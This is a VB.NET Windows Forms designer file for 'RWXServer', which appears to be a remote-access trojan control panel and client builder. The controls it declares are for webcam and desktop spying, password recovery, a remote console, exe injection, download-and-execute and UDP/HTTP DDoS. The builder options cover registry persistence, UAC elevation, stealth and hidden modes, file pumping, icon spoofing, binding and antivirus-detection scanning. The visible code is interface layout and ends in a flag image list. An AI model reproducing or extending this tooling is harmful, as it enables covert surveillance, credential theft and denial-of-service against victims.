<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class frmMain
    Inherits System.Windows.Forms.Form

    'Das Formular überschreibt den Löschvorgang, um die Komponentenliste zu bereinigen.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Wird vom Windows Form-Designer benötigt.
    Private components As System.ComponentModel.IContainer

    'Hinweis: Die folgende Prozedur ist für den Windows Form-Designer erforderlich.
    'Das Bearbeiten ist mit dem Windows Form-Designer möglich.  
    'Das Bearbeiten mit dem Code-Editor ist nicht möglich.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(frmMain))
        Me.Flags = New System.Windows.Forms.ImageList(Me.components)
        Me.Desktops = New System.Windows.Forms.ImageList(Me.components)
        Me.Timer1 = New System.Windows.Forms.Timer(Me.components)
        Me.MenuMain = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.ServerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.UpdateToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.CloseToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripMenuItem1 = New System.Windows.Forms.ToolStripSeparator()
        Me.UninstallToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.SurveillanceToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.WebcamToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.DesktopToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.PasswordRecoveryToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ProcessManagerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ServiceManagerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.InstalledSoftwareToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RemoteConsoleToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RegistryManagerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.FileManagerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.InjectexeToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.MiscToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.PluginsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.tmrcons = New System.Windows.Forms.Timer(Me.components)
        Me.ImageList1 = New System.Windows.Forms.ImageList(Me.components)
        Me.ofdIcon = New System.Windows.Forms.OpenFileDialog()
        Me.tmrAlive = New System.Windows.Forms.Timer(Me.components)
        Me.TabPage7 = New System.Windows.Forms.TabPage()
        Me.TabPage10 = New System.Windows.Forms.TabPage()
        Me.TabPage11 = New System.Windows.Forms.TabPage()
        Me.TabPage12 = New System.Windows.Forms.TabPage()
        Me.TabPage13 = New System.Windows.Forms.TabPage()
        Me.TabPage14 = New System.Windows.Forms.TabPage()
        Me.StatusStrip1 = New System.Windows.Forms.StatusStrip()
        Me.ToolStripStatusLabel1 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.sentbytes = New System.Windows.Forms.ToolStripStatusLabel()
        Me.ToolStripStatusLabel2 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.ToolStripStatusLabel4 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.ToolStripStatusLabel5 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.ToolStripStatusLabel3 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.tmrDataflow = New System.Windows.Forms.Timer(Me.components)
        Me.Updates = New System.Windows.Forms.ImageList(Me.components)
        Me.MenuOnConnect = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.DeleteCommandToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripMenuItem2 = New System.Windows.Forms.ToolStripSeparator()
        Me.DeleteAllCommandsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.MultiMain = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.ClientsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.UpdateToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.CloseToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripMenuItem3 = New System.Windows.Forms.ToolStripSeparator()
        Me.UninstallToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.DLExecuteToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.DDoSToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.UDPToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.HTTPToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ContextMenuStrip1 = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.StopDDoSToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ContextMenuStrip2 = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.RemovePortToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.TabControlClass1 = New RWXServer.TabControlClass()
        Me.TabPage16 = New System.Windows.Forms.TabPage()
        Me.lstUpdates = New System.Windows.Forms.ListView()
        Me.ColumnHeader8 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader15 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader16 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.txtMOTD = New System.Windows.Forms.TextBox()
        Me.TabPage1 = New System.Windows.Forms.TabPage()
        Me.GroupBox5 = New System.Windows.Forms.GroupBox()
        Me.lblcMonitor = New System.Windows.Forms.Label()
        Me.lblcCountry = New System.Windows.Forms.Label()
        Me.lblcAV = New System.Windows.Forms.Label()
        Me.lblcLocation = New System.Windows.Forms.Label()
        Me.lblcVersion = New System.Windows.Forms.Label()
        Me.lblcOS = New System.Windows.Forms.Label()
        Me.lblcPCName = New System.Windows.Forms.Label()
        Me.lblcUser = New System.Windows.Forms.Label()
        Me.lblcIP = New System.Windows.Forms.Label()
        Me.pboxDesktop = New System.Windows.Forms.PictureBox()
        Me.lstConnections = New System.Windows.Forms.ListView()
        Me.ColumnHeader1 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader12 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader2 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader3 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader4 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader5 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader10 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader11 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader7 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.Clientname = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.TabPage15 = New System.Windows.Forms.TabPage()
        Me.lstDesktops = New System.Windows.Forms.ListView()
        Me.TabPage6 = New System.Windows.Forms.TabPage()
        Me.cmbWho = New System.Windows.Forms.ComboBox()
        Me.Label16 = New System.Windows.Forms.Label()
        Me.cmbCommand = New System.Windows.Forms.ComboBox()
        Me.lstOnConnect = New System.Windows.Forms.ListView()
        Me.ColumnHeader9 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader13 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader14 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.TabPage8 = New System.Windows.Forms.TabPage()
        Me.cmdstartUDP = New System.Windows.Forms.Button()
        Me.cmdstartHTTP = New System.Windows.Forms.Button()
        Me.txtStressLog = New System.Windows.Forms.TextBox()
        Me.lstDDoS = New System.Windows.Forms.ListView()
        Me.ColumnHeader6 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.TabPage9 = New System.Windows.Forms.TabPage()
        Me.txtmap2 = New System.Windows.Forms.TextBox()
        Me.txtmap1 = New System.Windows.Forms.TextBox()
        Me.WebBrowser1 = New System.Windows.Forms.WebBrowser()
        Me.TabPage2 = New System.Windows.Forms.TabPage()
        Me.GroupBox7 = New System.Windows.Forms.GroupBox()
        Me.cmdAddPort = New System.Windows.Forms.Button()
        Me.txtExtPort = New System.Windows.Forms.TextBox()
        Me.Label22 = New System.Windows.Forms.Label()
        Me.lstPorts = New System.Windows.Forms.ListView()
        Me.ColumnHeader18 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.GroupBox6 = New System.Windows.Forms.GroupBox()
        Me.cmdListen = New System.Windows.Forms.Button()
        Me.PictureBox12 = New System.Windows.Forms.PictureBox()
        Me.PictureBox11 = New System.Windows.Forms.PictureBox()
        Me.PictureBox10 = New System.Windows.Forms.PictureBox()
        Me.PictureBox9 = New System.Windows.Forms.PictureBox()
        Me.txthost = New System.Windows.Forms.TextBox()
        Me.Label6 = New System.Windows.Forms.Label()
        Me.Label2 = New System.Windows.Forms.Label()
        Me.chkPasswd = New System.Windows.Forms.CheckBox()
        Me.chkListen = New System.Windows.Forms.CheckBox()
        Me.btnSave = New System.Windows.Forms.Button()
        Me.txtDataPort = New System.Windows.Forms.TextBox()
        Me.txtPasswd = New System.Windows.Forms.TextBox()
        Me.txtPort = New System.Windows.Forms.TextBox()
        Me.Label7 = New System.Windows.Forms.Label()
        Me.Label5 = New System.Windows.Forms.Label()
        Me.Label4 = New System.Windows.Forms.Label()
        Me.Label3 = New System.Windows.Forms.Label()
        Me.TabPage3 = New System.Windows.Forms.TabPage()
        Me.TabControl1 = New System.Windows.Forms.TabControl()
        Me.TabPage17 = New System.Windows.Forms.TabPage()
        Me.GroupBox1 = New System.Windows.Forms.GroupBox()
        Me.Label33 = New System.Windows.Forms.Label()
        Me.txtbackuphost = New System.Windows.Forms.TextBox()
        Me.Label17 = New System.Windows.Forms.Label()
        Me.txtbuildgroup = New System.Windows.Forms.TextBox()
        Me.Label20 = New System.Windows.Forms.Label()
        Me.txtbuildport = New System.Windows.Forms.TextBox()
        Me.txtbuildpasswd = New System.Windows.Forms.TextBox()
        Me.Label18 = New System.Windows.Forms.Label()
        Me.Label19 = New System.Windows.Forms.Label()
        Me.txtbuildhost = New System.Windows.Forms.TextBox()
        Me.TabPage18 = New System.Windows.Forms.TabPage()
        Me.GroupBox2 = New System.Windows.Forms.GroupBox()
        Me.cmbRunOnce = New System.Windows.Forms.ComboBox()
        Me.Label21 = New System.Windows.Forms.Label()
        Me.txtstartupLM = New System.Windows.Forms.TextBox()
        Me.PictureBox13 = New System.Windows.Forms.PictureBox()
        Me.chkHKLM = New System.Windows.Forms.CheckBox()
        Me.chkHKCU = New System.Windows.Forms.CheckBox()
        Me.Label1 = New System.Windows.Forms.Label()
        Me.chkinstall = New System.Windows.Forms.CheckBox()
        Me.PictureBox8 = New System.Windows.Forms.PictureBox()
        Me.PictureBox7 = New System.Windows.Forms.PictureBox()
        Me.Label41 = New System.Windows.Forms.Label()
        Me.txtFolder = New System.Windows.Forms.TextBox()
        Me.RadioButton3 = New System.Windows.Forms.RadioButton()
        Me.RadioButton1 = New System.Windows.Forms.RadioButton()
        Me.RadioButton2 = New System.Windows.Forms.RadioButton()
        Me.Label32 = New System.Windows.Forms.Label()
        Me.txtstartup = New System.Windows.Forms.TextBox()
        Me.txtname = New System.Windows.Forms.TextBox()
        Me.GroupBox9 = New System.Windows.Forms.GroupBox()
        Me.PictureBox15 = New System.Windows.Forms.PictureBox()
        Me.chkElevate = New System.Windows.Forms.CheckBox()
        Me.PictureBox14 = New System.Windows.Forms.PictureBox()
        Me.chkUAC = New System.Windows.Forms.CheckBox()
        Me.chkcritical = New System.Windows.Forms.CheckBox()
        Me.chkpersistance = New System.Windows.Forms.CheckBox()
        Me.GroupBox10 = New System.Windows.Forms.GroupBox()
        Me.chkshowhidden = New System.Windows.Forms.CheckBox()
        Me.chkStealth = New System.Windows.Forms.CheckBox()
        Me.chkHidden = New System.Windows.Forms.CheckBox()
        Me.TabPage19 = New System.Windows.Forms.TabPage()
        Me.GroupBox3 = New System.Windows.Forms.GroupBox()
        Me.GroupBox11 = New System.Windows.Forms.GroupBox()
        Me.imgicon = New System.Windows.Forms.PictureBox()
        Me.btnicon = New System.Windows.Forms.Button()
        Me.kB = New System.Windows.Forms.Label()
        Me.txtsize = New System.Windows.Forms.TextBox()
        Me.chkpump = New System.Windows.Forms.CheckBox()
        Me.GroupBox16 = New System.Windows.Forms.GroupBox()
        Me.cmbspoof = New System.Windows.Forms.ComboBox()
        Me.GroupBox17 = New System.Windows.Forms.GroupBox()
        Me.imgspoof = New System.Windows.Forms.PictureBox()
        Me.GroupBox12 = New System.Windows.Forms.GroupBox()
        Me.cmdmutex = New System.Windows.Forms.Button()
        Me.txtMutex = New System.Windows.Forms.TextBox()
        Me.GroupBox8 = New System.Windows.Forms.GroupBox()
        Me.cbBind = New System.Windows.Forms.CheckBox()
        Me.txtBind = New System.Windows.Forms.TextBox()
        Me.cmdBind = New System.Windows.Forms.Button()
        Me.GroupBox4 = New System.Windows.Forms.GroupBox()
        Me.txtVersion4 = New System.Windows.Forms.TextBox()
        Me.txtVersion3 = New System.Windows.Forms.TextBox()
        Me.txtVersion2 = New System.Windows.Forms.TextBox()
        Me.txtVersion1 = New System.Windows.Forms.TextBox()
        Me.txtFileVersion4 = New System.Windows.Forms.TextBox()
        Me.txtFileVersion3 = New System.Windows.Forms.TextBox()
        Me.txtFileVersion2 = New System.Windows.Forms.TextBox()
        Me.txtFileVersion1 = New System.Windows.Forms.TextBox()
        Me.txtTrademark = New System.Windows.Forms.TextBox()
        Me.txtCopyright = New System.Windows.Forms.TextBox()
        Me.txtProduct = New System.Windows.Forms.TextBox()
        Me.txtCompany = New System.Windows.Forms.TextBox()
        Me.txtDescription = New System.Windows.Forms.TextBox()
        Me.txtTitle = New System.Windows.Forms.TextBox()
        Me.Label30 = New System.Windows.Forms.Label()
        Me.Label29 = New System.Windows.Forms.Label()
        Me.Label28 = New System.Windows.Forms.Label()
        Me.Label27 = New System.Windows.Forms.Label()
        Me.Label26 = New System.Windows.Forms.Label()
        Me.Label25 = New System.Windows.Forms.Label()
        Me.Label24 = New System.Windows.Forms.Label()
        Me.Label23 = New System.Windows.Forms.Label()
        Me.TabPage20 = New System.Windows.Forms.TabPage()
        Me.GroupBox14 = New System.Windows.Forms.GroupBox()
        Me.chkTOS = New System.Windows.Forms.CheckBox()
        Me.btnBuild = New System.Windows.Forms.Button()
        Me.ProgressBar1 = New System.Windows.Forms.ProgressBar()
        Me.GroupBox15 = New System.Windows.Forms.GroupBox()
        Me.lstBuild = New System.Windows.Forms.ListBox()
        Me.GroupBox13 = New System.Windows.Forms.GroupBox()
        Me.cmdLoad = New System.Windows.Forms.Button()
        Me.cmdSave = New System.Windows.Forms.Button()
        Me.cmbProfiles = New System.Windows.Forms.ComboBox()
        Me.TabPage5 = New System.Windows.Forms.TabPage()
        Me.lstScan = New System.Windows.Forms.ListView()
        Me.AntiVirus = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.Detection = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.txtscanner = New System.Windows.Forms.TextBox()
        Me.cmdScanner = New System.Windows.Forms.Button()
        Me.TabPage4 = New System.Windows.Forms.TabPage()
        Me.ChromeButton1 = New RWXServer.ChromeButton()
        Me.Label10 = New System.Windows.Forms.Label()
        Me.Label9 = New System.Windows.Forms.Label()
        Me.PictureBox1 = New System.Windows.Forms.PictureBox()
        Me.TextBox1 = New System.Windows.Forms.TextBox()
        Me.Label13 = New System.Windows.Forms.Label()
        Me.Label11 = New System.Windows.Forms.Label()
        Me.Label8 = New System.Windows.Forms.Label()
        Me.MenuMain.SuspendLayout()
        Me.StatusStrip1.SuspendLayout()
        Me.MenuOnConnect.SuspendLayout()
        Me.MultiMain.SuspendLayout()
        Me.ContextMenuStrip1.SuspendLayout()
        Me.ContextMenuStrip2.SuspendLayout()
        Me.TabControlClass1.SuspendLayout()
        Me.TabPage16.SuspendLayout()
        Me.TabPage1.SuspendLayout()
        Me.GroupBox5.SuspendLayout()
        CType(Me.pboxDesktop, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.TabPage15.SuspendLayout()
        Me.TabPage6.SuspendLayout()
        Me.TabPage8.SuspendLayout()
        Me.TabPage9.SuspendLayout()
        Me.TabPage2.SuspendLayout()
        Me.GroupBox7.SuspendLayout()
        Me.GroupBox6.SuspendLayout()
        CType(Me.PictureBox12, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.PictureBox11, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.PictureBox10, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.PictureBox9, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.TabPage3.SuspendLayout()
        Me.TabControl1.SuspendLayout()
        Me.TabPage17.SuspendLayout()
        Me.GroupBox1.SuspendLayout()
        Me.TabPage18.SuspendLayout()
        Me.GroupBox2.SuspendLayout()
        CType(Me.PictureBox13, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.PictureBox8, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.PictureBox7, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.GroupBox9.SuspendLayout()
        CType(Me.PictureBox15, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.PictureBox14, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.GroupBox10.SuspendLayout()
        Me.TabPage19.SuspendLayout()
        Me.GroupBox3.SuspendLayout()
        Me.GroupBox11.SuspendLayout()
        CType(Me.imgicon, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.GroupBox16.SuspendLayout()
        Me.GroupBox17.SuspendLayout()
        CType(Me.imgspoof, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.GroupBox12.SuspendLayout()
        Me.GroupBox8.SuspendLayout()
        Me.GroupBox4.SuspendLayout()
        Me.TabPage20.SuspendLayout()
        Me.GroupBox14.SuspendLayout()
        Me.GroupBox15.SuspendLayout()
        Me.GroupBox13.SuspendLayout()
        Me.TabPage5.SuspendLayout()
        Me.TabPage4.SuspendLayout()
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.SuspendLayout()
        '
        'Flags
        '
        Me.Flags.ImageStream = CType(resources.GetObject("Flags.ImageStream"), System.Windows.Forms.ImageListStreamer)
        Me.Flags.TransparentColor = System.Drawing.Color.Transparent
        Me.Flags.Images.SetKeyName(0, "ad.png")
        Me.Flags.Images.SetKeyName(1, "ae.png")
        Me.Flags.Images.SetKeyName(2, "af.png")
        Me.Flags.Images.SetKeyName(3, "ag.png")
        Me.Flags.Images.SetKeyName(4, "ai.png")
        Me.Flags.Images.SetKeyName(5, "al.png")
        Me.Flags.Images.SetKeyName(6, "am.png")
        Me.Flags.Images.SetKeyName(7, "an.png")
        Me.Flags.Images.SetKeyName(8, "ao.png")
        Me.Flags.Images.SetKeyName(9, "ar.png")
        Me.Flags.Images.SetKeyName(10, "as.png")
        Me.Flags.Images.SetKeyName(11, "at.png")
        Me.Flags.Images.SetKeyName(12, "au.png")
        Me.Flags.Images.SetKeyName(13, "aw.png")
        Me.Flags.Images.SetKeyName(14, "ax.png")
        Me.Flags.Images.SetKeyName(15, "az.png")
        Me.Flags.Images.SetKeyName(16, "ba.png")
        Me.Flags.Images.SetKeyName(17, "bb.png")
        Me.Flags.Images.SetKeyName(18, "bd.png")
        Me.Flags.Images.SetKeyName(19, "be.png")
        Me.Flags.Images.SetKeyName(20, "bf.png")
        Me.Flags.Images.SetKeyName(21, "bg.png")
        Me.Flags.Images.SetKeyName(22, "bh.png")
        Me.Flags.Images.SetKeyName(23, "bi.png")
        Me.Flags.Images.SetKeyName(24, "bj.png")
        Me.Flags.Images.SetKeyName(25, "bm.png")
        Me.Flags.Images.SetKeyName(26, "bn.png")
        Me.Flags.Images.SetKeyName(27, "bo.png")
        Me.Flags.Images.SetKeyName(28, "br.png")
        Me.Flags.Images.SetKeyName(29, "bs.png")
        Me.Flags.Images.SetKeyName(30, "bt.png")
        Me.Flags.Images.SetKeyName(31, "bv.png")
        Me.Flags.Images.SetKeyName(32, "bw.png")
        Me.Flags.Images.SetKeyName(33, "by.png")
        Me.Flags.Images.SetKeyName(34, "bz.png")
        Me.Flags.Images.SetKeyName(35, "ca.png")
        Me.Flags.Images.SetKeyName(36, "catalonia.png")
        Me.Flags.Images.SetKeyName(37, "cc.png")
        Me.Flags.Images.SetKeyName(38, "cd.png")
        Me.Flags.Images.SetKeyName(39, "cf.png")
        Me.Flags.Images.SetKeyName(40, "cg.png")
        Me.Flags.Images.SetKeyName(41, "ch.png")
        Me.Flags.Images.SetKeyName(42, "ci.png")
        Me.Flags.Images.SetKeyName(43, "ck.png")
        Me.Flags.Images.SetKeyName(44, "cl.png")
        Me.Flags.Images.SetKeyName(45, "cm.png")
        Me.Flags.Images.SetKeyName(46, "cn.png")
        Me.Flags.Images.SetKeyName(47, "co.png")
        Me.Flags.Images.SetKeyName(48, "cr.png")
        Me.Flags.Images.SetKeyName(49, "cs.png")
        Me.Flags.Images.SetKeyName(50, "cu.png")
        Me.Flags.Images.SetKeyName(51, "cv.png")
        Me.Flags.Images.SetKeyName(52, "cx.png")
        Me.Flags.Images.SetKeyName(53, "cy.png")
        Me.Flags.Images.SetKeyName(54, "cz.png")
        Me.Flags.Images.SetKeyName(55, "de.png")
        Me.Flags.Images.SetKeyName(56, "dj.png")
        Me.Flags.Images.SetKeyName(57, "dk.png")
        Me.Flags.Images.SetKeyName(58, "dm.png")
        Me.Flags.Images.SetKeyName(59, "do.png")
        Me.Flags.Images.SetKeyName(60, "dz.png")
        Me.Flags.Images.SetKeyName(61, "ec.png")
        Me.Flags.Images.SetKeyName(62, "ee.png")
        Me.Flags.Images.SetKeyName(63, "eg.png")
        Me.Flags.Images.SetKeyName(64, "eh.png")
        Me.Flags.Images.SetKeyName(65, "england.png")
        Me.Flags.Images.SetKeyName(66, "er.png")
        Me.Flags.Images.SetKeyName(67, "es.png")
        Me.Flags.Images.SetKeyName(68, "et.png")
        Me.Flags.Images.SetKeyName(69, "europeanunion.png")
        Me.Flags.Images.SetKeyName(70, "fam.png")
        Me.Flags.Images.SetKeyName(71, "fi.png")
        Me.Flags.Images.SetKeyName(72, "fj.png")
        Me.Flags.Images.SetKeyName(73, "fk.png")
        Me.Flags.Images.SetKeyName(74, "fm.png")
        Me.Flags.Images.SetKeyName(75, "fo.png")
        Me.Flags.Images.SetKeyName(76, "fr.png")
        Me.Flags.Images.SetKeyName(77, "ga.png")
        Me.Flags.Images.SetKeyName(78, "gb.png")
        Me.Flags.Images.SetKeyName(79, "gd.png")
        Me.Flags.Images.SetKeyName(80, "ge.png")
        Me.Flags.Images.SetKeyName(81, "gf.png")
        Me.Flags.Images.SetKeyName(82, "gh.png")
        Me.Flags.Images.SetKeyName(83, "gi.png")
        Me.Flags.Images.SetKeyName(84, "gl.png")
        Me.Flags.Images.SetKeyName(85, "gm.png")
        Me.Flags.Images.SetKeyName(86, "gn.png")
        Me.Flags.Images.SetKeyName(87, "gp.png")
        Me.Flags.Images.SetKeyName(88, "gq.png")
        Me.Flags.Images.SetKeyName(89, "gr.png")
        Me.Flags.Images.SetKeyName(90, "gs.png")
        Me.Flags.Images.SetKeyName(91, "gt.png")
        Me.Flags.Images.SetKeyName(92, "gu.png")
        Me.Flags.Images.SetKeyName(93, "gw.png")
        Me.Flags.Images.SetKeyName(94, "gy.png")
        Me.Flags.Images.SetKeyName(95, "hk.png")
        Me.Flags.Images.SetKeyName(96, "hm.png")
        Me.Flags.Images.SetKeyName(97, "hn.png")
        Me.Flags.Images.SetKeyName(98, "hr.png")
        Me.Flags.Images.SetKeyName(99, "ht.png")
        Me.Flags.Images.SetKeyName(100, "hu.png")
        Me.Flags.Images.SetKeyName(101, "id.png")
        Me.Flags.Images.SetKeyName(102, "ie.png")
        Me.Flags.Images.SetKeyName(103, "il.png")
        Me.Flags.Images.SetKeyName(104, "in.png")
        Me.Flags.Images.SetKeyName(105, "io.png")
        Me.Flags.Images.SetKeyName(106, "iq.png")
        Me.Flags.Images.SetKeyName(107, "ir.png")
        Me.Flags.Images.SetKeyName(108, "is.png")
        Me.Flags.Images.SetKeyName(109, "it.png")
        Me.Flags.Images.SetKeyName(110, "jm.png")
        Me.Flags.Images.SetKeyName(111, "jo.png")
        Me.Flags.Images.SetKeyName(112, "jp.png")
        Me.Flags.Images.SetKeyName(113, "ke.png")
        Me.Flags.Images.SetKeyName(114, "kg.png")
        Me.Flags.Images.SetKeyName(115, "kh.png")
        Me.Flags.Images.SetKeyName(116, "ki.png")
        Me.Flags.Images.SetKeyName(117, "km.png")
        Me.Flags.Images.SetKeyName(118, "kn.png")
        Me.Flags.Images.SetKeyName(119, "kp.png")
        Me.Flags.Images.SetKeyName(120, "kr.png")
        Me.Flags.Images.SetKeyName(121, "kw.png")
        Me.Flags.Images.SetKeyName(122, "ky.png")
        Me.Flags.Images.SetKeyName(123, "kz.png")
        Me.Flags.Images.SetKeyName(124, "la.png")
        Me.Flags.Images.SetKeyName(125, "lb.png")
        Me.Flags.Images.SetKeyName(126, "lc.png")
        Me.Flags.Images.SetKeyName(127, "li.png")
        Me.Flags.Images.SetKeyName(128, "lk.png")
        Me.Flags.Images.SetKeyName(129, "lr.png")
        Me.Flags.Images.SetKeyName(130, "ls.png")
        Me.Flags.Images.SetKeyName(131, "lt.png")
        Me.Flags.Images.SetKeyName(132, "lu.png")
        Me.Flags.Images.SetKeyName(133, "lv.png")
        Me.Flags.Images.SetKeyName(134, "ly.png")
        Me.Flags.Images.SetKeyName(135, "ma.png")
        Me.Flags.Images.SetKeyName(136, "mc.png")
        Me.Flags.Images.SetKeyName(137, "md.png")
        Me.Flags.Images.SetKeyName(138, "me.png")
        Me.Flags.Images.SetKeyName(139, "mg.png")
        Me.Flags.Images.SetKeyName(140, "mh.png")
        Me.Flags.Images.SetKeyName(141, "mk.png")
        Me.Flags.Images.SetKeyName(142, "ml.png")
        Me.Flags.Images.SetKeyName(143, "mm.png")
        Me.Flags.Images.SetKeyName(144, "mn.png")
        Me.Flags.Images.SetKeyName(145, "mo.png")
        Me.Flags.Images.SetKeyName(146, "mp.png")
        Me.Flags.Images.SetKeyName(147, "mq.png")
        Me.Flags.Images.SetKeyName(148, "mr.png")
        Me.Flags.Images.SetKeyName(149, "ms.png")
        Me.Flags.Images.SetKeyName(150, "mt.png")
        Me.Flags.Images.SetKeyName(151, "mu.png")
        Me.Flags.Images.SetKeyName(152, "mv.png")
        Me.Flags.Images.SetKeyName(153, "mw.png")
        Me.Flags.Images.SetKeyName(154, "mx.png")
        Me.Flags.Images.SetKeyName(155, "my.png")
        Me.Flags.Images.SetKeyName(156, "mz.png")
        Me.Flags.Images.SetKeyName(157, "na.png")
        Me.Flags.Images.SetKeyName(158, "nc.png")
        Me.Flags.Images.SetKeyName(159, "ne.png")
        Me.Flags.Images.SetKeyName(160, "nf.png")
        Me.Flags.Images.SetKeyName(161, "ng.png")
        Me.Flags.Images.SetKeyName(162, "ni.png")
        Me.Flags.Images.SetKeyName(163, "nl.png")
        Me.Flags.Images.SetKeyName(164, "no.png")
        Me.Flags.Images.SetKeyName(165, "np.png")
        Me.Flags.Images.SetKeyName(166, "nr.png")
        Me.Flags.Images.SetKeyName(167, "nu.png")
        Me.Flags.Images.SetKeyName(168, "nz.png")
        Me.Flags.Images.SetKeyName(169, "om.png")
        Me.Flags.Images.SetKeyName(170, "pa.png")
        Me.Flags.Images.SetKeyName(171, "pe.png")
        Me.Flags.Images.SetKeyName(172, "pf.png")
        Me.Flags.Images.SetKeyName(173, "pg.png")
        Me.Flags.Images.SetKeyName(174, "ph.png")
        Me.Flags.Images.SetKeyName(175, "pk.png")
        Me.Flags.Images.SetKeyName(176, "pl.png")
        Me.Flags.Images.SetKeyName(177, "pm.png")
        Me.Flags.Images.SetKeyName(178, "pn.png")
        Me.Flags.Images.SetKeyName(179, "pr.png")
        Me.Flags.Images.SetKeyName(180, "ps.png")
        Me.Flags.Images.SetKeyName(181, "pt.png")
        Me.Flags.Images.SetKeyName(182, "pw.png")
        Me.Flags.Images.SetKeyName(183, "py.png")
        Me.Flags.Images.SetKeyName(184, "qa.png")
        Me.Flags.Images.SetKeyName(185, "re.png")
        Me.Flags.Images.SetKeyName(186, "ro.png")
        Me.Flags.Images.SetKeyName(187, "rs.png")
